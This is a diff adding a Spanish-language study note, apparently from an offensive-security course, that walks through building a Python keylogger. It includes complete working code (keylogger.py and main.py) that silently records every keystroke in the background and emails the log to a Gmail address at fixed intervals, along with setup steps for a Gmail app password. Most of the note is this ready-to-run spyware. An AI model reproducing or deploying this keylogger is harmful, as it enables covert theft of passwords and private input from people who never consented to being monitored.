@@ -253,3 +253,211 @@ Aquí te recomiendo **separar por herramientas**, muy limpio para Obsidian.
 - Snippets sockets
     
 - Snippets argparse
+
+
+
+
+
+
+
+
+
+
+---
+
+# **📌 10.13 — Keylogger en Python (pynput + email)**
+
+## ✔️ Introducción
+
+Un keylogger es un software diseñado para capturar las pulsaciones del teclado y almacenarlas o enviarlas de manera remota.  
+En entornos de seguridad ofensiva, esta técnica permite estudiar cómo se comportan ciertos sistemas frente a la monitorización del input del usuario.
+
+En este tema se construye un keylogger modular en Python capaz de:
+
+- Registrar cualquier tecla pulsada
+    
+- Reportar periódicamente las pulsaciones por email
+    
+- Ejecutarse en segundo plano
+    
+- Apagarse de forma controlada
+    
+
+---
+
+# **🧱 Arquitectura del Keylogger**
+
+El diseño se basa en tres bloques:
+
+|Componente|Función|
+|---|---|
+|**Captura en segundo plano**|Listener que permanece activo sin mostrar ventana ni interacción visible.|
+|**Registro de pulsaciones**|Convierte caracteres y teclas especiales en texto estructurado.|
+|**Sistema de reporting**|Envía periódicamente el contenido capturado mediante email.|
+
+Para realizar el envío automático es necesario usar una contraseña de aplicación del proveedor de correo (por ejemplo, Gmail → “Contraseñas de aplicación”).
+
+---
+
+# **📚 Dependencias necesarias**
+
+```bash
+pip install pynput
+pip install termcolor
+```
+
+---
+
+# **🧩 keylogger.py**
+
+Código totalmente corregido:
+
+```python
+#!/usr/bin/env python3
+
+import pynput.keyboard
+import threading
+import smtplib
+from email.mime.text import MIMEText
+
+
+class Keylogger:
+    def __init__(self, interval, sender, recipients, password):
+        self.log = ""
+        self.interval = interval
+        self.sender = sender
+        self.recipients = recipients
+        self.password = password
+
+        self.request_shutdown = False
+        self.timer = None
+
+    def pressed_key(self, key):
+        try:
+            self.log += key.char
+
+        except AttributeError:
+            name = str(key).split(".")[-1].capitalize()
+            if name == "Space":
+                self.log += " "
+            else:
+                self.log += f" [{name}] "
+
+        print(self.log)
+
+    def send_email(self, subject, body):
+        msg = MIMEText(body)
+        msg["Subject"] = subject
+        msg["From"] = self.sender
+        msg["To"] = ", ".join(self.recipients)
+
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(self.sender, self.password)
+            smtp.sendmail(self.sender, self.recipients, msg.as_string())
+
+        print("\n[+] Email enviado correctamente!\n")
+
+    def report(self):
+        if self.log:
+            self.send_email("Keylogger Report", self.log)
+
+        self.log = ""
+
+        if not self.request_shutdown:
+            self.timer = threading.Timer(self.interval, self.report)
+            self.timer.start()
+
+    def shutdown(self):
+        self.request_shutdown = True
+        if self.timer:
+            self.timer.cancel()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
+
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+```
+
+---
+
+# **🧩 main.py**
+
+Código corregido:
+
+```python
+#!/usr/bin/env python3
+
+from keylogger import Keylogger
+from termcolor import colored
+import signal
+import os
+
+
+def def_handler(sig, frame):
+    print(colored("\n[!] Saliendo...\n", "red"))
+    my_keylogger.shutdown()
+    os._exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+
+if __name__ == '__main__':
+    # Configuración
+    sender = "tucorreo@gmail.com"
+    recipients = ["tucorreo@gmail.com"]
+    password = "XXXX XXXX XXXX"  # Contraseña de aplicación
+    interval = 45                # segundos
+
+    my_keylogger = Keylogger(interval, sender, recipients, password)
+    my_keylogger.start()
+```
+
+---
+
+# **🔐 Contraseñas de aplicación (Gmail)**
+
+Para que Python pueda enviar correos:
+
+1. Activar verificación en dos pasos.
+    
+2. Abrir → _Contraseñas de aplicación_.
+    
+3. Crear una nueva app (por ejemplo “Keylogger”).
+    
+4. Copiar la contraseña generada.
+    
+
+Esa es la que se usa en la variable `password`.
+
+---
+
+# **📁 ¿Qué va en los apuntes y qué va en archivos?**
+
+📌 **Lo ideal es esto:**
+
+### **En los apuntes**
+
+- Explicación del funcionamiento
+    
+- Arquitectura
+    
+- Qué hace cada parte (listener, reporting, email)
+    
+- Pasos para generar la contraseña de aplicación
+    
+- Estructura de carpetas
+    
+- Explicación del flujo
+    
+
+### **En archivos separados `.py`**
+
+- `keylogger.py`
+    
+- `main.py`
+    
+
+➡️ Los scripts completos es mejor dejarlos fuera para no ensuciar mucho tu GitHub y mantener apuntes limpios y fáciles de leer.
